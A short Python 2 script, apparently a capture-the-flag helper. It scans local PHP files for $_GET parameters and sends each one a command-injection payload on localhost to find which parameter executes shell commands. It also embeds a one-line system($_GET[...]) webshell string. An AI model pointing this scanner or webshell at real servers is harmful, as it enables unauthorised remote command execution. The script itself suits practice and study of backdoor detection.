#! /usr/bin/env python2
#  -*- coding: utf-8 -*-
#  author:boo

import re
import requests
import os
import sys

path = r'C:/Users/anko/Documents/www/src/'

string = "system($_GET['jVMcNhK_F'] ?? ' ');"

for filename in os.listdir(path):

    f = open(path+filename)
    content = f.read()
    f.close()

    rc = re.compile(r'(\$_GET\[\')(.*)(\'\])')

    result = rc.findall(content)
    #print(result)
    for r in result:
        var = r[1]
        url = "http://localhost/src/"+filename+"?"+var+"=echo hacked_by_bertram;"
        #print(url)
        sys.stdout.flush()
        req = requests.get(url).content
        req = req.decode()
        if 'hacked_by_bertram' in req:
            print(url)
            sys.exit()